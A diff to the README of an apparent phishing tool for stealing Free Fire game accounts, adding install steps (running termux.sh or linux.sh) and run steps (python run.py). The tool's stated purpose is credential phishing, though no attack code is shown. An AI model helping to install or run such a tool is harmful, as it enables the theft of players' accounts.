@@ -59,7 +59,23 @@ FREEFIRE-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A FREEFIRE ACCOUNT OF Y
 
 ## ✅ INSTALLATION [ Android Termux ] :
 ```
-pkg update -y
+bash termux.sh
+
+```
+## ✅ INSTALLATION [ Linux terminal] :
+```
+bash linux.sh
+
+```
+## Running in termux and terminal :
+
+```
+python run.py
+
+or
+
+python3 run.py
+
 ```
 # ■□■ ⚠ Warning ⚠ ■□■
 
